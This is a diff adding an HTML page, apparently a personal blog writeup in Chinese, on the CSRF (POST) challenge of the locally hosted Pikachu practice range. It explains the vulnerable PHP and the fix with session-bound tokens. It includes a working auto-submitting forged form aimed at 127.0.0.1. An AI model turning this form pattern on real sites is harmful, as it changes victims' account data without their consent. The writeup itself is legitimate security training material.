@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pikachu CSRF POST Writeup - gz2008的技术博客</title>
+    <style>
+        *{box-sizing:border-box} body{margin:0;background:#f6f9fc;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;color:#1e293b;line-height:1.8;padding:40px 20px}.container{max-width:750px;margin:auto;background:#fff;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,.05);padding:40px}.back-link{color:#2563eb;text-decoration:none}h1{font-size:2rem;line-height:1.35;color:#0f172a;border-bottom:2px solid #eef2f6;padding-bottom:15px}h2{font-size:1.35rem;margin-top:30px;border-left:4px solid #3b82f6;padding-left:10px}p,li{color:#475569}code{background:#f1f5f9;padding:2px 5px;border-radius:4px;overflow-wrap:anywhere;color:#be123c}pre{background:#1e293b;color:#e2e8f0;padding:15px;border-radius:6px;overflow-x:auto}pre code{background:none;color:inherit;padding:0}.note{background:#fff7ed;border-left:4px solid #f97316;padding:12px 16px}@media(max-width:600px){body{padding:0}.container{padding:24px 18px}h1{font-size:1.65rem}}
+    </style>
+</head>
+<body>
+<main class="container">
+    <a class="back-link" href="index.html">← 返回 Pikachu 首页</a>
+    <h1>Pikachu - CSRF（POST）</h1>
+    <p>分类：Web / CSRF · 环境：本机 Pikachu 靶场 · 题目路径：Cross-site request forgery → CSRF(post)</p>
+    <p class="note">仅在自己部署的 <code>127.0.0.1</code> 靶场练习。示例只修改测试账号资料，不针对任何真实站点。</p>
+
+    <h2>一、与 GET 题的区别</h2>
+    <p>登录后访问 <code>/pikachu/vul/csrf/csrfpost/csrf_post.php</code>，编辑入口为 <code>csrf_post_edit.php</code>。该页面把资料放在 POST 请求体中，但没有增加 CSRF Token，因此“参数不在 URL 中”并不等于具备 CSRF 防护。</p>
+
+    <h2>二、源码与成因</h2>
+    <pre><code>if(isset($_POST['submit'])){
+    $getdata = escape($link, $_POST);
+    $query = "update member set
+        sex='{$getdata['sex']}',
+        phonenum='{$getdata['phonenum']}',
+        address='{$getdata['add']}',
+        email='{$getdata['email']}'
+        where username='{$_SESSION['csrf']['username']}'";
+    execute($link, $query);
+}</code></pre>
+    <p>服务端依赖 Session 判断“当前是谁”，却没有验证“这个修改请求是否由本站页面发起”。攻击者可以在自己的页面中放置一个自动提交表单，浏览器会在同源 Cookie 策略允许时携带用户会话。</p>
+
+    <h2>三、最小测试页面</h2>
+    <pre><code>&lt;form action="http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"
+      method="post"&gt;
+  &lt;input name="sex" value="boy"&gt;
+  &lt;input name="phonenum" value="10000000000"&gt;
+  &lt;input name="add" value="csrf-post-test"&gt;
+  &lt;input name="email" value="csrf-post@example.test"&gt;
+  &lt;input name="submit" value="submit"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
+    <p>在本地靶场中，先让测试用户登录，再加载该测试页面。若返回到个人中心且资料发生变化，说明修改接口可被跨站伪造。</p>
+
+    <h2>四、关键结论</h2>
+    <ul>
+        <li>POST 只改变参数传输位置，不能自动阻止跨站请求。</li>
+        <li>SQL 转义解决的是 SQL 注入，不是 CSRF。</li>
+        <li>真正的防护应绑定当前会话和当前表单的不可预测 Token。</li>
+    </ul>
+
+    <h2>五、修复思路</h2>
+    <p>在服务端生成 Session 绑定的随机 Token，并在表单中提交；更新前使用固定时间比较函数校验 Token。再结合 SameSite Cookie、Origin 校验和敏感操作确认，可降低跨站伪造风险。不要仅依赖隐藏字段名称或前端脚本校验。</p>
+</main>
+</body>
+</html>
